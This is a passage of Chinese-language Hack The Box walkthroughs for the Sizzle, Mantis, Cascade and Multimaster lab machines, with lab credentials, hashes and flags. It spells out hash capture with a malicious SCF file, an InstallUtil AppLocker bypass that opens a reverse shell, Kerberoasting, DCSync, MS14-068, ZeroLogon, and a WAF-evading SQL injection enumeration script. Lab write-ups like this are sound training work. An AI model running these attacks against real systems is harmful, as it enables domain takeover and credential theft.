理論上要重登才可以生效但是重登之後會被重製

`net group BACKUP_ADMINS tom /add /domain`
所以我改放tom在裡面
![image](https://hackmd.io/_uploads/BJtzOwdrA.png)

## root.txt

進去看，沒權限
![image](https://hackmd.io/_uploads/BJKIuvOSC.png)

所以我去Backup Scripts裡面看看
![image](https://hackmd.io/_uploads/HklYqvuSC.png)

最後我在BackupScript.ps1找到admin的密碼
`administrator：Cr4ckMeIfYouC4n!`

![image](https://hackmd.io/_uploads/B1NNcwdr0.png)

用ssh連過去
934ede21e8a253530b4ca200412df9d6
![image](https://hackmd.io/_uploads/S1w-iDurR.png)

---

# Sizzle
![image](https://hackmd.io/_uploads/SkmjovurA.png)

---
## port

![image](https://hackmd.io/_uploads/ryFikO_H0.png)
![image](https://hackmd.io/_uploads/HkKn1_dBA.png)
![image](https://hackmd.io/_uploads/HJGpkOOH0.png)

## ftp

好像進不去(?
![image](https://hackmd.io/_uploads/Hk1J-OuB0.png)

## smb

他smb有開
![image](https://hackmd.io/_uploads/Bk40ed_rC.png)

有一個Department Shares 可讀取
![image](https://hackmd.io/_uploads/Byi1dK_S0.png)

`sudo mount -t cifs -o rw,username=guest,password= '//10.10.10.103/Department Shares' share`

先把他掛載起來
![image](https://hackmd.io/_uploads/r1SCutOSR.png)

有很多用戶之外好像沒啥，public 是可以寫入的
![image](https://hackmd.io/_uploads/BJ7IKKdHR.png)

這邊其實可以測到public有我們看不見的 "交互作用" 
寫入的檔案大概4分鐘後會被刪掉
但是我沒測出來，我的檔案不會被刪

### catch NetNTLMv2

可以先參考下面的論文

原文(原網站關了)：
https://www.helpnetsecurity.com/2017/05/15/stealing-windows-credentials-using-google-chrome/

https://www.malwarebytes.com/blog/news/2017/05/smb-and-scf-another-good-reason-to-disable-superfluous-protocols

我理解起來是這樣：

SCF 是個在 Windows 98 / ME / NT / 2000 / XP 中比較活躍的檔案
裡面的檔案看起來是這樣

```scf=
[Shell]
Command=2
IconFile=explorer.exe,3

[Taskbar]
Command=ToggleDesktop
```

與他相似的還有lnk 檔案 which is window's file(只是chrome 有內建過濾，所以這個洞已經被補上了)

而我們可以將icon file 的位置鏈接到我們的smbserver

> 將圖標位置設置為遠程SMB服務器是已知的攻擊矢量,在訪問遠程文件共享等服務時會濫用Windows自動身份驗證功能。

```scf=
[Shell]
IconFile=\\255.255.255.255\icon
```

下載後,將觸發請求 下載目錄打開的那一刻 在Windows File Explorer中查看文件,刪除文件或與其他文件一起使用(這幾乎是不可避免的)。無需單擊"或打開下載的文件– Windows File Explorer將自動嘗試檢索"圖標(icon)"。

這時候我們就可以透過就捕獲到受害者的用戶名和NTLMv2密碼hash值

### attack start

這裡有攻擊的範例(看前面就好，他給的畫面比較健全)
https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/

最前面放小老鼠會讓文件的順序在最前面
(時而成功時而不成功)

![image](https://hackmd.io/_uploads/HJeXrfPI0.png)

用responder 去攔截，大概會跑個1分中上下
![image](https://hackmd.io/_uploads/SJbWR-DLA.png)

接著會爆出amanda的hash
![image](https://hackmd.io/_uploads/Hk7rSGP8A.png)

## amanda

將這串丟進檔案裡面，用hashcat解開
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

![image](https://hackmd.io/_uploads/H130tGP80.png)

amanda：Ashare1972

![image](https://hackmd.io/_uploads/HkfUcfPIC.png)

我查了winrm 發現不能用，smb也沒有什麼有用的東西
![image](https://hackmd.io/_uploads/Bykm2GvUA.png)

### LDAP

接著我去抓他的ldap的內容
https://zh.wikipedia.org/zh-tw/%E8%BD%BB%E5%9E%8B%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E5%8D%8F%E8%AE%AE

`ldapdomaindump -u 'htb.local\amanda' -p Ashare1972 10.10.10.103`

![image](https://hackmd.io/_uploads/HkQj-psLR.png)

裡面可以看到所有的用戶的group跟server的版本

![image](https://hackmd.io/_uploads/rJ7WmaiL0.png)
![image](https://hackmd.io/_uploads/ryj-m6oUC.png)


### ADCS

剛剛最前面其實有掃到過
但是找到用戶跟密碼就沒再去看
現在先掃看看
我發現了一個401的網頁
![image](https://hackmd.io/_uploads/SkoKBrpUR.png)
![image](https://hackmd.io/_uploads/Hy4CppiLA.png)

去到那個網頁之後發現它要我輸入帳號密碼
而我輸入了amanda的帳號密碼
![image](https://hackmd.io/_uploads/Hywd6poLC.png)

出現了一個可以重新給我們 certificate的網頁
有了這個網頁之後，我們可以自己做一個新的憑證
讓我們登入 server 的後台
![image](https://hackmd.io/_uploads/rJplR6sI0.png)

所以我們要先創造一個新的certificate 還有 key

先request 它的 certificate
![image](https://hackmd.io/_uploads/r11RNqpIA.png)

選擇user certificate
![image](https://hackmd.io/_uploads/SyD0N5TIR.png)

結果我發現我沒辦法選東西，submit出去也只是error
![image](https://hackmd.io/_uploads/rkCUnc6UA.png)

參考資料：
https://thesecmaster.com/blog/how-to-request-a-certificate-from-windows-adcs
https://www.tecmint.com/generate-csr-certificate-signing-request-in-linux/

我需要先去用openssl生成一個新的csr
`openssl req -new -newkey rsa:2048 -nodes -keyout yofat.key -out yofat.csr`
~~裡面亂輸就好~~
![image](https://hackmd.io/_uploads/rJsTpqp8C.png)

有了這個就可以去請求新的證書
![image](https://hackmd.io/_uploads/BkxzR9aU0.png)

去到點擊user certificate 那裏的下面有一個advance...點下去
然後將剛剛生成的csr檔案複製貼到這裡
![image](https://hackmd.io/_uploads/S1ftAqTUA.png)

下載這個DER檔案
![image](https://hackmd.io/_uploads/HkFl1ipUR.png)

用DER檔案加上剛剛生成的key 就可以用amanda登入到server
`evil-winrm -c certnew.cer -k yofat.key -i 10.10.10.103 -u amanda -p Ashare1972 -S`
![image](https://hackmd.io/_uploads/HypfeopU0.png)

### CLM bypass

透過下面這串指令，我們可以知道現在是受限模式
`$executioncontext.sessionstate.languagemode`

![image](https://hackmd.io/_uploads/rJbJWopU0.png)

似乎用wvil-winrm 可以避開AMSI
https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal

我們是被applocker限制
`Get-AppLockerPolicy -Effective -XML`

![image](https://hackmd.io/_uploads/ryNAWsaLA.png)

受限模式就是CLM
PowerShell Constrained Language Mode (CLM)
https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/

它只適用於 Windows PowerShell version 5.1 or PowerShell 7. 
它會限制很多東西

![image](https://hackmd.io/_uploads/Hy7LNsTLA.png)

有查到一個叫做powershell 降維攻擊的方法
可以嘗試，但是他不會成功
好像通常都可以試試看
![image](https://hackmd.io/_uploads/BJ7YFj6IR.png)

我們可以用這個方法繞過有著applocker + CLM 的模式
https://book.hacktricks.xyz/v/cn/windows-hardening/authentication-credentials-uac-and-efs
https://github.com/padovah4ck/PSByPassCLM/tree/master

我用wget傳上去，然後輸入下面這串，它其實就是用installutil 去繞過AppLocker(要記得先開監聽)

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.5 /rport=443 /U C:\Users\amanda\Documents\123.exe
```

![image](https://hackmd.io/_uploads/Hk3iZt0LA.png)
![image](https://hackmd.io/_uploads/r1WRbKRUR.png)

### user of amanda

可以看到現在已經不是限制模式了
![image](https://hackmd.io/_uploads/Sk0JMY0I0.png)

下一步要進到下一個身分組\用戶

稍微檢查一下，發現到它有監聽 port 88 (Kerber)
![image](https://hackmd.io/_uploads/ryqDOFC8R.png)

基本上這邊通常就是要做Kerberoast
我打算用rubeus去拿到某個user的NTLM
但由於rubeus 是c語言開發的，我有找到有人整理的整個exe的工具包

https://github.com/GhostPack/Rubeus
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

一樣用wget 就可以上傳上去，要記得樣放進\windows\temp裡面
不然applocker一樣會限制你

![image](https://hackmd.io/_uploads/SyQk3tRUA.png)

拿掉mrlky的密碼
![image](https://hackmd.io/_uploads/Bkne2FR8C.png)

`hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt`

mrlky:Football#7
![image](https://hackmd.io/_uploads/H1T00K0L0.png)

## mrlky

在進到mrlky之前，我們要先跟前面一樣先創一個key跟csr
可以點回前面ADCS那裏

`evil-winrm -c mk.cer -k mk.key -i 10.10.10.103 -u mrlky -p Football#7 -S`

![image](https://hackmd.io/_uploads/Sk10c9AUR.png)

### user.txt

454a0316f1bd5351ed511765a68ef9df
![image](https://hackmd.io/_uploads/SkqXiqAIR.png)


### bloodhound

我先用bloodhound
一樣到temp執行
![image](https://hackmd.io/_uploads/SJCqzjRIR.png)

然後用smbserver把結果的zip載下來

![image](https://hackmd.io/_uploads/ByRJUsCLR.png)
![image](https://hackmd.io/_uploads/r1Wvbo0UC.png)

可寫入不可讀是怎樣==
![image](https://hackmd.io/_uploads/SyZWNoCUR.png)

我有找到一個神奇的路徑可以使用
C:\windows\System32\spool\drivers\color

![image](https://hackmd.io/_uploads/r1kvSsRI0.png)

把檔案抓下來
![image](https://hackmd.io/_uploads/HkFPUiRU0.png)

把neo4j跟bloodhound打開
選擇 shortest path to admin 
可以看族譜知道接下來我們要用DCSync攻擊來變成admin

![image](https://hackmd.io/_uploads/HJjfvj0UC.png)

更細節一點可以看
![image](https://hackmd.io/_uploads/SJ0RDj0I0.png)

可以看到它有GetChangesAll 跟 Getchanges
![image](https://hackmd.io/_uploads/rJNpwjALC.png)

既然它有權限，我應該可以直接用secretdump

### DCSync attack

直接用secretsdump , admin的ntlm就出來了
![image](https://hackmd.io/_uploads/Skm6Ki0IC.png)

## admin

![image](https://hackmd.io/_uploads/Sy-ias08R.png)

我們只能用這三種去登入admin
`smbexec.py , psexec.py wmiexec.py`

因為
![image](https://hackmd.io/_uploads/SyFRpi0LR.png)

### 然後有一個我不是很懂得點

在前面的題目(不同的機器)也有出現secretdump的題目
當時是有開winrm，所以可以用pass the hash 的方式直接登入admin
但現在他不支援，掃CME的時候它顯示pwn3d的密碼就只是它的nthash
不理解的是為甚麼只要nthash就好
而不是lmhash+nthash
還是它不是pass the hash
它密碼就跟nthash一樣

### root.txt

(smbexec 不能用cd)

`sudo impacket-psexec htb.local/administrator@10.10.10.103 -hashes :f6b7160bfc91823792e0ac3a162c9267`

![image](https://hackmd.io/_uploads/H1-oehC8A.png)

root.txt

![image](https://hackmd.io/_uploads/H1neW2CLC.png)

---

# Mantis

![image](https://hackmd.io/_uploads/HyJq-3RI0.png)

---

## port

有個有sql的網頁

![image](https://hackmd.io/_uploads/B1EPIzWvC.png)
![image](https://hackmd.io/_uploads/HkPOLMbwC.png)
![image](https://hackmd.io/_uploads/Sk-58M-D0.png)
![image](https://hackmd.io/_uploads/Hk2j8MbwR.png)


### smbmap 

我發現他好像需要有帳號密碼才能用

![image](https://hackmd.io/_uploads/HJzD_zWDA.png)

(name:MANTIS) (domain:htb.local)
![image](https://hackmd.io/_uploads/ryDltMZwC.png)


### http

掃了之後沒甚麼感興趣的內容
但是有注意到裡面有一個登入的地方

用burp 攔截之後可以看到他除了要對帳密以外
還要檢查token

![image](https://hackmd.io/_uploads/S11iS4fvR.png)

在response中可以找到被隱藏的token

![image](https://hackmd.io/_uploads/SJQkIEzPC.png)

但是他是隨機的，測過幾遍還是沒辦法使用

---

接著我去找一下別人的作法發現
有一個我沒掃到的port 1337
所以接下來就換1337

---
### port 1337

我掃到了一個叫做secure_notes的網頁
![image](https://hackmd.io/_uploads/rywPrnXwA.png)

web.config是404，dev裡面有東西
![image](https://hackmd.io/_uploads/H19j8a7vA.png)

原本以為他只有一些readme的內容
![image](https://hackmd.io/_uploads/SyNgwp7wA.png)

結果他把東西藏在最下面

```txt=
Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
```

![image](https://hackmd.io/_uploads/HJpXw6Xw0.png)

這看起來是一串 binary 的數字
要解密的話要先轉成 hex
然後再轉成 ascii code
就可以先拿到 OrchardCMS 的憑證

可以用bash code 或是 python

### 解密 OrchardCMS 憑證方法 1
#### bash 解密法


```bash=
perl -lpe '$_=pack"B*",$_' < <( echo 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001 )
```

chatgpt的友情解釋

![image](https://hackmd.io/_uploads/HkzGs67vA.png)

### 解密 OrchardCMS 憑證方法 2
#### python 解密法

```python=
>>> import binascii
>>> pasw = int("010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001", 2)
>>> binascii.unhexlify("%x" % pasw)
```

### OrchardCMS

接著我就把密碼解出來

`@dm!n_P@ssW0rd!`
![image](https://hackmd.io/_uploads/SyrjspQPC.png)

但其實如果感覺足夠靈敏可以發現這個 dev 檔案本身也是個被加密的名字
所以我先把他解 base64
![image](https://hackmd.io/_uploads/S1jVTpQwR.png)

接著我用 xxd 反轉術式，讀取十六進制數據，然後將其轉換回二進制數據並輸出
拿到了sql的密碼
`m$$ql_S@_P@ssW0rd!`

![image](https://hackmd.io/_uploads/HJYIaT7P0.png)

進 dashboard 沒看到能讓我 RCE 的地方
![image](https://hackmd.io/_uploads/r1wpfA7vC.png)

### SQL

我打算用有GUI介面的 dbeaver

![image](https://hackmd.io/_uploads/rJ5IV0mPA.png)

但因為版本問題有點麻煩
所以回去用老方法
`impacket-mssqlclient 'admin@10.10.10.52'`

![image](https://hackmd.io/_uploads/SycSD0XD0.png)

`SELECT name FROM master.dbo.sysdatabases;`

![image](https://hackmd.io/_uploads/S1VPY0XPR.png)

`USE orcharddb;`

![image](https://hackmd.io/_uploads/S1qhFAmv0.png)

`SELECT table_name FROM information_schema.tables;`

![image](https://hackmd.io/_uploads/S1JjcRQPC.png)

我發現了好像會記錄 user 訊息的地方

![image](https://hackmd.io/_uploads/S17OsRQDA.png)

`SELECT username, password FROM blog_Orchard_Users_UserPartRecord;`

```txt=
admin      AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==   

James      J@m3s_P@ssW0rd!
```

![image](https://hackmd.io/_uploads/SJjM3CXDC.png)

admin 一定不是我們的目標
![image](https://hackmd.io/_uploads/SkpIxyVvR.png)

## James

用 CME 只有掃到他只有開smb，還有一個 mantis

![image](https://hackmd.io/_uploads/By-3ClbuA.png)

smbmap 給的內容 nothing interesting
![image](https://hackmd.io/_uploads/rJA30lZOR.png)

這裡的攻擊很迷
看大家的write up 也看不出為甚麼是這樣打
或許是題目做得太通靈了


### MS14-068 (CVE-2014-6324)

接下來要做的是 CVE-2014-6324 
又叫做 MS14-068
https://www.cnblogs.com/feizianquan/p/11760564.html#autoid-5-0-0

漏洞成因是：
1. 不安全的設計導致可以偽造密碼
2. PAC不存在於TGT裡面，並把PAC信息解密并利用客户端设定的签名算法验证签名
3. 以上如果都通過，就可以偽造新的PAC透過TGT傳到client端

### 如何攻擊

用網路上的 ms14-068，可以用他來進行，但要先去 rpcclient 下 lookupnames [user] 拿到機器的 SID

或是利用 goldenpac 直接變成 admin，goldenpac 就是 M14-068 + PsExec

### 攻擊開始

在測試時發現一直都行不通，之後我將沒看過的名字加入密碼中以及host ， 看起來這種方法是，james -> 傳送ticket -> mantis 

`10.10.10.52     mantis htb.local mantis.htb.local`

`impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis'`

![image](https://hackmd.io/_uploads/BkGuHZ-dR.png)

就變成admin

![image](https://hackmd.io/_uploads/B1TGIbZ_A.png)


## user.txt

6bf49a12d1c9d89cf2d1f25d55bfc1a2

![image](https://hackmd.io/_uploads/ryuE_WbdA.png)

## root.txt

76487362cbfb81ebfd63c215536b1b63

![image](https://hackmd.io/_uploads/HJuOuZbuC.png)

---

# Cascade

![image](https://hackmd.io/_uploads/HJJnobW_R.png)

---

## port

看到他有開 LDAP 跟 RPC

![image](https://hackmd.io/_uploads/BkYn2WZd0.png)
![image](https://hackmd.io/_uploads/rkNpnb-_C.png)

### RPC

在這裡掃到了很多user
![image](https://hackmd.io/_uploads/Bks36--OA.png)

### LDAP

接著我去掃看看 LDAP 
-b 那裏是 nmap 就有掃到的內容

```bash=
ldapsearch -H ldap://10.10.10.182 -x -s sub -b 'DC=cascade,DC=local' "(objectclass=*)" "*"
```

裡面是所有的訊息
![image](https://hackmd.io/_uploads/r1IkCuL3R.png)

所以我把 `*` 改成 user
![image](https://hackmd.io/_uploads/r166CO8hC.png)

我在 Ryan Thompson 找到額外的資訊

![image](https://hackmd.io/_uploads/HJDRkYL20.png)

他多一個 cascadeLegacyPwd
![image](https://hackmd.io/_uploads/rkJyxtU2R.png)

這應該是密碼吧🤔
rY4n5eva

![image](https://hackmd.io/_uploads/rJSrxtUnC.png)

然後我去比對跟 RPC 裡面列出來的內容
這應該是他

![image](https://hackmd.io/_uploads/BJl_etUhR.png)

我就去看他有沒有開 smb 
```bash=
crackmapexec smb -u r.thompson -p rY4n5eva --shares 10.10.10.182
```

![image](https://hackmd.io/_uploads/rk1JfFI3A.png)

我把 data 裡面的東西載下來

![image](https://hackmd.io/_uploads/ByRKSKL3C.png)

在 Meeting_Notes_June_2018.html
他說密碼跟普通 admin 一樣

![image](https://hackmd.io/_uploads/SydiUtI2A.png)

所以我繼續翻
看他所謂的普通 admin 有沒有線索
在 s.smith 的 VNC Install.reg

![image](https://hackmd.io/_uploads/SyttDtLnR.png)

裡面有一行
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f

![image](https://hackmd.io/_uploads/SyLJOFU30.png)

我發現有一個東西可以檢測密碼
雖然這東西 metasploit 裡面其實就有
https://github.com/jeroennijhof/vncpwd.git

先把他轉成 2 進位

```bash=
echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass
```

![image](https://hackmd.io/_uploads/By9YbqUh0.png)

然後密碼就會被他解出來了
sT333ve2
他好像是 DES 加密

![image](https://hackmd.io/_uploads/B1GKbqU2C.png)

## s.smith

winrm 可以用
![image](https://hackmd.io/_uploads/rk_DHqI30.png)

```bash=
evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2
```

![image](https://hackmd.io/_uploads/Hyaor9L2C.png)

---

### user.txt

5cc53ec457714f4df730ad025bc13235

![image](https://hackmd.io/_uploads/BJR-I9820.png)

---

### going to admin

他的 group 是 Audit Share
![image](https://hackmd.io/_uploads/ryEB_5LhR.png)

這個 group 只有他
![image](https://hackmd.io/_uploads/BJ7kFqLnC.png)

翻了一下決定回去看 smb
發現很多 sql 檔案

![image](https://hackmd.io/_uploads/S1hD5qL3C.png)

發現了另一個帳號

> 1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local

![image](https://hackmd.io/_uploads/Sk_405UhA.png)

但解不出來

![image](https://hackmd.io/_uploads/r1HnysU30.png)

所以我回去看發現這個批次檔案
發現他運行這個 exe

![image](https://hackmd.io/_uploads/B1wrbsInA.png)

是個用 .net 編譯的程式

![image](https://hackmd.io/_uploads/Hyu7zsLnC.png)

所以我轉用 windows 用  dnSPY 打開

反編譯後重點應該是這段程式
那組密碼不知道是誰的
但有一個 pwd 的程式碼可以追蹤看看

![image](https://hackmd.io/_uploads/Syux2iI3A.png)

我在這裡設斷點
![image](https://hackmd.io/_uploads/rkhD3oInR.png)

讓他執行之後，讓他去找剛剛看的 Audit.db
![image](https://hackmd.io/_uploads/SJ-33jIh0.png)

發現一個 ArkSvc 用戶
但密碼不見了

![image](https://hackmd.io/_uploads/SyoEToLhR.png)

按 F10 讓他跑就會出現了
w3lc0meFr31nd
![image](https://hackmd.io/_uploads/BJslehUhC.png)

## ArkSvc

他有開winrm 

![image](https://hackmd.io/_uploads/HkedFe2I3A.png)

![image](https://hackmd.io/_uploads/Hy2jx283R.png)

### to root

發現他有垃圾桶的 group

![image](https://hackmd.io/_uploads/H1b-Wh820.png)

```powershell=
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects
```
所以列出歷史刪除的紀錄
最後一筆叫做 tempadmin 可以看看
![image](https://hackmd.io/_uploads/SyveM3UhC.png)

```powershell=
Get-ADObject -filter { SAMAccountName -eq "TempAdmin" } -includeDeletedObjects -property *
```

cascadeLegacyPwd
![image](https://hackmd.io/_uploads/HJS4znInA.png)

baCT3r1aN00dles
![image](https://hackmd.io/_uploads/BkpbBh820.png)

admin 能使用 winrm
![image](https://hackmd.io/_uploads/SyuEBhL30.png)

## admin

![image](https://hackmd.io/_uploads/rkjdr2I30.png)

### root.txt

02ea5cae0ea9a27aeb42e45372d6ddb8
![image](https://hackmd.io/_uploads/rkP9B3LnR.png)

---

# Multimaster
![image](https://hackmd.io/_uploads/Byxej3I20.png)

---
掃描後可以看到他開了 ldap 、http、smb

![image](https://hackmd.io/_uploads/SJZYEk_hA.png)
![image](https://hackmd.io/_uploads/rJBc4kdhR.png)
![image](https://hackmd.io/_uploads/r1GgHyOnA.png)
![image](https://hackmd.io/_uploads/HyOxBku2A.png)

## search

用了所有工具都沒掃到什麼
所以決定直接用看的去 80 port

## http

發現一個可以尋找同事的地方
我只是 enter 就跑出所有 user 了
有可能是 sqli 的問題🤔

![image](https://hackmd.io/_uploads/ryBGuyOhA.png)

### nosql

所以我用 burpsuit 去抓他
發現他是用 api 去抓資料的
以及他是使用 nosql 的

![image](https://hackmd.io/_uploads/rJOlYkdhR.png)

所以我就試試看 nosqli 它回傳空值

![image](https://hackmd.io/_uploads/BJunYk_2C.png)

我掃了網站發現，基本上都是 403
雖然網站上沒有顯示，但應該是因為 waf 把它擋住了
所以可以判斷他應該也有設置黑名單來防止 sqli

![image](https://hackmd.io/_uploads/SkQziJO3R.png)

所以我去找他禁止了甚麼字

```bash=
wfuzz -c -u http://10.10.10.179/api/getColleagues -w /usr/share/seclists/Fuzzing/special-chars.txt -d '{"name":"FUZZ"}' -H 'Content-Type: application/json;charset=utf-8' -t 1
```

![image](https://hackmd.io/_uploads/Bkm7n1_2A.png)

所以把 200 去掉
這些是被攔截的字

![image](https://hackmd.io/_uploads/r1sX6JO30.png)

### sqlmap

所以我用 sqlmap 去掃看看

```bash=
sqlmap -r co.request --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy http://127.0.0.1:8080
```

![image](https://hackmd.io/_uploads/ry8rW-_nR.png)

--dbs

![image](https://hackmd.io/_uploads/Hk38M-OnC.png)

把所有資料庫的內容 dump 出來

--dump-all --exclude-sysdbs

除了出了很多用戶以外

![image](https://hackmd.io/_uploads/BJMZxzd30.png)

也跑出很多密碼的 hash

![image](https://hackmd.io/_uploads/BJv4xGun0.png)

我將密碼整合起來拿去解密

```bash=
hashcat -m 17900 hashs /usr/share/wordlists/rockyou.txt --force
```

發現他只有三組密碼

![image](https://hackmd.io/_uploads/rJE2WM_2R.png)

我拿去尋找這是誰的帳號
但他回我他要有帳號才可以掃
所以我們要回去找他 domain 的 user

![image](https://hackmd.io/_uploads/SkPq7MOnR.png)

### using sqlmap

他用這串去攻擊他
所以我打算用他的 payload 去尋找我要找的 domain user

![image](https://hackmd.io/_uploads/BJfP4fd3R.png)

我先把他轉成 hex

![image](https://hackmd.io/_uploads/SJZxSGu2R.png)

傳回去後可以看到有一串特別不一樣的內容

![image](https://hackmd.io/_uploads/SJPYHfd2C.png)

所以我把他原本那串 payloads 改成 default_domain()
![image](https://hackmd.io/_uploads/HJfEIGdnC.png)

塞進去之後可以發現
他的 default 是 MEGACORP

![image](https://hackmd.io/_uploads/r1RSLGOn0.png)

### RID

接著我就想這要怎麼用
我就查到 sql 中有一個 SUSER_SID
他會回傳安全性內容的 sid

https://learn.microsoft.com/zh-tw/sql/t-sql/functions/suser-sid-transact-sql?view=sql-server-ver16

也就是每個不同 user 的身分證的概念
![image](https://hackmd.io/_uploads/H1IIYfO3R.png)

```sql=
-8469' UNION ALL SELECT 96,96,96,96,SUSER_SID('MEGACORP\Domain Admins')-- GQcY	
```

![image](https://hackmd.io/_uploads/ryxycz_20.png)

同上面使用的方法
它回傳了東西給我
但看起來應該是不能用的啦

![image](https://hackmd.io/_uploads/H1MN5fOnR.png)

所以我又去找了怎模用
master.dbo.fn_varbintohexstr

https://blog.uwinfo.com.tw/auth/article/bike/407

```sql=
-8469' UNION ALL SELECT 96,96,96,96,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins'))-- GQcY
```

這是他的 rid：
0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000
他的 sid 是：
0x0105000000000005150000001c00d1bcd181f1492bdfc236

![image](https://hackmd.io/_uploads/Bk1b3GdnA.png)

管理員 default rid 是 500

![image](https://hackmd.io/_uploads/ByAdaGO2C.png)

500 的 hex 是 0x1f4 把他改成 4 bytes 再 reverse 他
結果是 0xf4010000

所以理論上 sid + 0xf4010000 會是管理員
我用 SUSER_SNAME 證實看看

![image](https://hackmd.io/_uploads/SkRO0z_nA.png)

所以確定可以這麼做
我編了一個腳本用來列出所有的 domain_users

```python=
#!/usr/bin/env python3

import binascii
import requests
import struct
import sys
import time


payload_template = """test' UNION ALL SELECT 58,58,58,{},58-- -"""


def unicode_escape(s):
    return "".join([r"\u{:04x}".format(ord(c)) for c in s])


def issue_query(sql):
    while True:
        resp = requests.post(
            "http://10.10.10.179/api/getColleagues",
            data='{"name":"' + unicode_escape(payload_template.format(sql)) + '"}',
            headers={"Content-type": "text/json; charset=utf-8"},
            proxies={"http": "http://127.0.0.1:8080"},
        )
        if resp.status_code != 403:
            break
        sys.stdout.write("\r[-] Triggered WAF. Sleeping for 30 seconds")
        time.sleep(30)
    return resp.json()[0]["email"]


print("[*] Finding domain")
domain = issue_query("DEFAULT_DOMAIN()")
print(f"[+] Found domain: {domain}")

print("[*] Finding Domain SID")
sid = issue_query(f"master.dbo.fn_varbintohexstr(SUSER_SID('{domain}\Domain Admins'))")[:-8]
print(f"[+] Found SID for {domain} domain: {sid}")

for i in range(500, 10500):
    sys.stdout.write(f"\r[*] Checking SID {i}" + " " * 50)
    num = binascii.hexlify(struct.pack("<I", i)).decode()
    acct = issue_query(f"SUSER_SNAME({sid}{num})")
    if acct:
        print(f"\r[+] Found account [{i:05d}]  {acct}" + " " * 30)
    time.sleep(1)

print("\r" + " " * 50)
```

除了上面剛剛做的所有 sqli 流程
為了規避 waf 讓他睡覺 30 秒

![image](https://hackmd.io/_uploads/rJMiJLd2A.png)

我將這些 user 存下來再去找一次哪個帳號可以用
tushikikatomo:finance1

![image](https://hackmd.io/_uploads/B1QvgUuh0.png)

## user

tushikikatomo 有 winrm 可以用

![image](https://hackmd.io/_uploads/B1njl8dh0.png)

帳號的名字跟主機裡的名字不一樣ㄟ🤔
alcibiades

![image](https://hackmd.io/_uploads/S1Ey-8_30.png)

### user.txt

89656f1686ae9cc4d336d1ee00278fa8

![image](https://hackmd.io/_uploads/ryiMbIO3A.png)

---

## 分岐

我看了一下正在執行的程式有哪些
發現很多code

![image](https://hackmd.io/_uploads/SkxZuIOhA.png)

原本我是找到 CVE-2019-1414 
要使用 cefdebug
https://github.com/taviso/cefdebug/releases

有點麻煩，而且動作要很快
因為他的 uuid 很快就會失效
接下來會遇到，要穿過很多不同的身分組
用傳統的方法
從 whoami /priv 查看權限
利用權限漏洞提升到 admin

但有鑑於這台機器是 2020 年 5 月製作的
windows 版本是 2016(?
我另外還查到了一個很有名的漏洞
CVE-2020–1472 aka ZeroLogon aka 三秒駭入你的 AD

原理：https://medium.com/cycraft/cve-2020-1472-zerologon-aa24b97e3fe2

也就是說如果我用 ZeroLogon
可以直接跳過繁雜的穿過不同身分組
直接提升 admin 

---

## ZeroLogon

https://github.com/dirkjanm/CVE-2020-1472.git

```bash=
python3 cve-2020-1472-exploit.py MULTIMASTER 10.10.10.179
```

基本上所有帳戶都被 dump 出來了

![image](https://hackmd.io/_uploads/BJsJavuhC.png)

```bash=
impacket-secretsdump -no-pass -just-dc MULTIMASTER\$@10.10.10.179
```

Administrator:500:aad3b435b51404eeaad3b435b51404ee:69cbf4a9b7415c9e1caf93d51d971be0

![image](https://hackmd.io/_uploads/S1UXTP_nC.png)

接著可以利用 pass the hash 的方式
變成 admin
![image](https://hackmd.io/_uploads/B1m1-ddh0.png)

![image](https://hackmd.io/_uploads/SJRCgOuhR.png)

cd6c252a87fe2b945f6ed651cb39106b
![image](https://hackmd.io/_uploads/Bka-WOd20.png)

The End
---